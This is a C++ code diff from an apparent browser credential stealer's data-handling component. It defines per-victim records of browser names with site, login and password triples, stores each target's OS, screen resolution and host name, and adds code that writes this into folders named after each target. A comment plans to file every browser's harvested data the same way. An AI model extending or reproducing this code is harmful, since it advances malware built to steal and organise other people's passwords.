@@ -20,13 +20,15 @@ namespace InterProcess {
 		struct BrowserData { //all fields are required
 			std::string browserName;
 			std::vector<std::tuple<std::string, std::string, std::string>>resources; //res.name - login - pass
-		}_browserData;
+		};
+
+		std::vector<std::unique_ptr<BrowserData>>browsersData;
 
 		std::string _targetId; //required field
 	};
 
 	class IPCworkDispatcher:private FileManager { //class that encapsulates and implements parallel message queue processing
-	protected:                                    //private inheritance to hide fileManager methods 
+	protected:                                    //private inheritance of fileManager to hide methods 
 		IPCworkDispatcher() {
 			p_worker = std::make_unique<std::thread>(std::bind(&IPCworkDispatcher::dataWaiter, this));
 		}
@@ -58,8 +60,23 @@ namespace InterProcess {
 		}
 	private:
 		bool write() override {
-			openTo(root.u8string() + "/" + currentData->_targetId);
-			//iter throught the data ptr and write it to file;
+			try {
+				std::filesystem::path path(root); //user folder path
+				path.concat(currentData->_targetId); 
+
+				createDir(path); //creating user folder with targetId as name
+				
+				openTo(std::filesystem::path(path).concat("/info.txt")); //creating file with os info
+				
+				dataFile << "os:" << currentData->_targetInfo.os << "\n"
+					<< "screen:" << currentData->_targetInfo.resolution << "\n"
+					<< "host:" << currentData->_targetInfo.hostName << "\n";
+				close();
+			}
+			catch (std::exception& e) {
+				std::cout << e.what();
+			}
+			//iter throught the all browsers data //create their folders and write all info into it
 			return true;
 		}
 		void dataWaiter() {     //{spinlocked} waiting for new data and then then calls the specific callback
@@ -73,7 +90,6 @@ namespace InterProcess {
 					callback(currentData->_targetId); //send data's id to other process
 
 					std::lock_guard<std::mutex>dataLock(dataMt);
-					dataQueue.pop();
 				}
 			}
 		}
